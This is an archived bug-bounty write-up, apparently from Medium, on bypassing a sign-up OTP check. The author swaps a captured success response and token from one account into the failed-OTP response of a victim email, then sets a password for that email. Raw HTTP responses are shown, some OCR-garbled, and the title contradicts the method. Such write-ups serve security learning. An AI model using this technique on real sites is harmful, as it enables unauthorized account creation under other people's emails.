# OTP BYPASS WithOUT RESPONSE MANIPULATION

- **Source URL:** https://medium.com/@milanjain7906/otp-bypass-response-manipulation-bb3bed07de5c?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20221122102455/https://medium.com/@milanjain7906/otp-bypass-response-manipulation-bb3bed07de5c
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/881 (id 881)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# OTP BYPASS WithOUT RESPONSE MANIPULATION

Hii, all! Scriptkiddie is back with a new hacking story. So a few days ago, I was hunting on one of the website where I am able to bypass OTP without response manipulation. Let’s stared


# How website worked ?..

when I go to my target. I noticed that the website used OTP for the sign-up page, and when you enter the correct OTP, you will be redirected to the page where you can create your password.

sign up (email) — → Otp — — → create your password


However, when I submitted this request in BURPSuite, I discovered that if you enter the correct OTP, it will grant you a token.

so i think that let’s paly this token


```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Connection: close.
Access-Control-Allow-Origin: https://xxxxxxxx.com
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT
Access-Control-Allow-Headers: X-Requested-With, User-Agent, Referer, Content-Type,
Cache-Control, accesstoken, x-auth-token, accept
Access-Control-Max-Age: 5400
Access-Control-Allow-Credentials: true
Recorded with Top,"max_age":604800)
CF-Cache-Status: DYNAMIC
NEL: {"success_fraction":0,"report_to":"cf-nel", "max_age":604800)
Server: cloudflare
CF-RAY: 756833754fec9b80-FRA
alt-svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400
Content-Length: 373
{"token":"eyJhbGciOiJIUZI1NiIsInR5CCI6IkpXVCJ9.eyJpZCI6 ImE 1 ZmQ5ND ZmOGYzMzA4ZGU1MjliODY1MWZmYTFiYTAXIiwiY2FsbHBpbi I
6IjV2 MUt ZREDFSX02 UVFzRGhRVEZ3 R3 UiLCJjbGllbnRUYWciOiJUZXh0cldlYiIsInVuaXF1ZURldmljZUlkIjoiMjU3OThhOGY 1K5aav7RJ 1DVRpoFi_o", "teamId":""}
```
# Let’s paly with token:-

When I see that the website is using tokens, I sign up using attacker@gmail.com, enter the correct OTP, and save the response in the repeter’s tab.


Then I sign up again with victim@gmail.com and enter the incorrect OTP, and I see that the response is that the OTP is incorrect, and no token is granted to me this time because I entered the incorrect OTP.


After some thought, I realised that I only need the token I have token of (attacker@gmail.com). So I decided to switch the responses.

then i requste a opt from victim@gmail.com and fill wrong otp and then i do intercept the request and change it with response of attacker@gmail.com response

Response of attacker@gmail.com — — — → response of victim@gmail.com


```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Content-Length: 103
Connection: close
Access-Control-Allow-Origin: https://xxxxxx.com
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT
Access-Control-Allow-Headers: X-Requested-With, User-Agent, Referer, Content-Type, Cache-Control, accesstoken, x-auth-token, accept
Access-Control-Max-Age: 5400
Access-Control-Allow-Credentials: true
CF-Cache-Status: DYNAMIC
Report-To:
{"endpoints": [ {"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=066YmV1BzFEXEYO6TmFN9QpZUOEM791FK44uG6wDmgWC2Pw4cv4tUYfIfF%2F9U0Gp8mBc1chYn44cE91gIiCLwd0%2FuXYHbgrp2oL Uo 1N7SwdXUIGCF8fPxLf AmdJdNMY%2BnfWH"}],"group":"cf-nel", "max_age"
: 604800)
NEL: {"success_fraction":0,"report_to":"cf-nel", "max_age":604800)
Server: cloudflare.
CF-RAY: 75683bc7ddc6924d-FRA
alt-svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400
Recorded with iTop Screen Recorder
{"retcode":200020, "retmsg": "The activation code is not correct. Please try again. Thanks!", "result":{}}
```
— — — — →

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Connection: close.
Access-Control-Allow-Origin: https://xxxxxxxx.com
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT
Access-Control-Allow-Headers: X-Requested-With, User-Agent, Referer, Content-Type,
Cache-Control, accesstoken, x-auth-token, accept
Access-Control-Max-Age: 5400
Access-Control-Allow-Credentials: true
Recorded with Top,"max_age":604800)
CF-Cache-Status: DYNAMIC
NEL: {"success_fraction":0,"report_to":"cf-nel", "max_age":604800)
Server: cloudflare
CF-RAY: 756833754fec9b80-FRA
alt-svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400
Content-Length: 373
{"token":"eyJhbGciOiJIUZI1NiIsInR5CCI6IkpXVCJ9.eyJpZCI6 ImE 1 ZmQ5ND ZmOGYzMzA4ZGU1MjliODY1MWZmYTFiYTAXIiwiY2FsbHBpbi I
6IjV2 MUt ZREDFSX02 UVFzRGhRVEZ3 R3 UiLCJjbGllbnRUYWciOiJUZXh0cldlYiIsInVuaXF1ZURldmljZUlkIjoiMjU3OThhOGY 1K5aav7RJ 1DVRpoFi_o", "teamId":""}
```
and what it will redirect me to a page where I can create my password, and then I will be try to login with victim@gmail.com and my newly created password. i am able to login in .

Mission accomplished… .. otp bypassed !!!


Follow me for more
